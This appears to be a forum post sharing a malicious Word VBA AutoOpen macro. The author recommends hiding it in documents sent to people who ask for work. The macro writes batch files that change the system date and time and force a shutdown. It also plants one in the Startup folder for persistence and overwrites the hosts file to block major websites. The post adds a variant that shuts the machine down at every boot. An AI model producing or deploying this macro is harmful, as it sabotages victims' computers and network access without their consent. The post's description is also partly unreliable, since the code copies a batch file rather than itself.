I made this in an IT lesson when i was bored. You can use this when people ask for work (Works extremly well if you working with macros).

Sub AutoOpen() Dim message As String Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\christmas.bat", True) a.writeline ("date 25-12-2006") a.writeline ("time 00:00:00.00") a.writeline ("shutdown -s") a.Close Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\xmas.bat", True) a.writeline ("date 25-12-2006") a.writeline ("time 00:00:00.00") a.Close Set fs = CreateObject("Scripting.FileSystemObject") FileCopy "c:\xmas.bat", "c:\documents and settings\all users\start menu\programs\startup\Time.bat" Shell ("c:\christmas.bat") Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\windows\system32\drivers\etc\hosts", True) a.writeline ("127.0.0.1 localhost") a.writeline ("127.0.0.2 www.google.com") a.writeline ("127.0.0.3 www.yahoo.com") a.writeline ("127.0.0.4 www.myspace.com") a.writeline ("127.0.0.5 www.miniclips.com") a.writeline ("127.0.0.6 www.hotmail.com") a.writeline ("127.0.0.7 www.msn.com") a.writeline ("127.0.0.8 www.google.com.au") a.writeline ("127.0.0.9 www.youtube.com") a.writeline ("127.0.0.10 www.mamma.com") a.Close message = "This was created by Spid3rm4n and B14ckb1rd." End Sub

What it does it:

  1. Creates a file (.bat file) which has the CMD shutdown -s in it with xmas time.
  2. Runs the file it creates & shutdown their comp.
  3. Saves a copy of itself in startup & somehwere on C:
  4. If they run this at home it will block websites listed.
  5. If you really wanna screw around change this “a.writeline (“date 25-12-2006”)” to:

Set fs = CreateObject("Scripting.FileSystemObject") Set a = fs.CreatetextFile("c:\xmas.bat", True) a.writeline ("shutdown -s") a.writeline ("time 00:00:00.00") a.Close

This will start shutdown procedure as soon as the computer gets round to running the files in startup.

To stop the shutdown command (shutdown -s) open MS-Dos and type shutdown -a to cancel the shutdown.
